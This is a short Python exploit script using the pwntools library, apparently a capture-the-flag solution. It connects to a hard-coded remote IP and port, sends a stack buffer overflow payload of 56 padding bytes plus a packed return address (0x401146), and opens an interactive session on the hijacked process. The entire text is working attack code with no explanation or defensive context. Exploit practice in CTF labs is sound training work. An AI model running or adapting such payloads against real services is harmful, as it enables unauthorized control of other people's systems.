from pwn import *

r = remote("35.205.161.145",49153)

payload = "A"*56 + p64(0x0000000000401146)

r.sendline(payload)
r.interactive()